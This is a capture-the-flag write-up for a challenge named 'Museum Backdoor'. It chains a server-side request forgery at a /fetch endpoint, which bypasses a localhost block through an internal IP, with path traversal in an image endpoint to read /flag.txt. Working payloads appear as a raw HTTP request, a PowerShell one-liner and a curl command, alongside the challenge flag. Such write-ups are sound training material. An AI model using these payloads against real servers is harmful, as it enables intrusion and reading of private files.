# Museum Backdoor - CTF Challenge

## Challenge Description

A set of deaccessioned artifacts shows odd discrepancies between labels and ledger. The console insists everything is in order. Can you get the flag at `/flag.txt`?

**Challenge URL:** <https://mnbvcxzasdfghj-csc26.cybersecuritychallenge.al>

### Flag

`CSC26{3f46de9cbd46ddf353ea1620b8ef9f69837e832a46fc248127e9ea0ff9c0a88f}`

## Vulnerability

This challenge exploits two vulnerabilities chained together:

### 1. Server-Side Request Forgery (SSRF)

- **Endpoint:** `/fetch`
- **Method:** POST
- **Content-Type:** `text/plain`
- **Vulnerability:** The endpoint accepts arbitrary URLs in the request body and makes server-side requests to them
- **Bypass:** The application blocks localhost/127.0.0.1 but allows requests to internal IP `172.16.0.30`

### 2. Path Traversal

- **Endpoint:** `/public/images?filename=`
- **Vulnerability:** The `filename` parameter doesn't properly sanitize path traversal sequences (`../`)
- **Exploitation:** Can read arbitrary files on the system

## Solution

### Discovery Process

1. **Found the SSRF endpoint** by analyzing network traffic (`payload1` and `payload2` files)
2. **Identified internal server** at `172.16.0.30` from legitimate API requests
3. **Explored internal server** structure via SSRF:
   - `/` - Museum Intranet home page
   - `/about` - Revealed an image endpoint: `/public/images?filename=accession_1.jpg`
   - `/blogs` - Work in progress page
4. **Exploited path traversal** in the images endpoint to read `/flag.txt`

### Exploitation Chain

```
POST /fetch
Content-Type: text/plain

http://172.16.0.30/public/images?filename=../../../flag.txt
```

The server returns the flag as decimal ASCII values, one per line.

## Flag

```
CSC26{3f46de9cbd46ddf353ea1620b8ef9f69837e832a46fc248127e9ea0ff9c0a88f}
```

## Usage

### Using Python Script

```bash
python exploit.py
```

### Manual Exploitation (PowerShell)

```powershell
$r = Invoke-WebRequest -Uri "https://mnbvcxzasdfghj-csc26.cybersecuritychallenge.al/fetch" -Method POST -ContentType "text/plain" -Body "http://172.16.0.30/public/images?filename=../../../flag.txt"
$bytes = $r.Content -split "`n" | ForEach-Object { [int]$_ }
[System.Text.Encoding]::ASCII.GetString($bytes)
```

### Manual Exploitation (curl)

```bash
curl -X POST https://mnbvcxzasdfghj-csc26.cybersecuritychallenge.al/fetch \
  -H "Content-Type: text/plain" \
  -d "http://172.16.0.30/public/images?filename=../../../flag.txt"
```
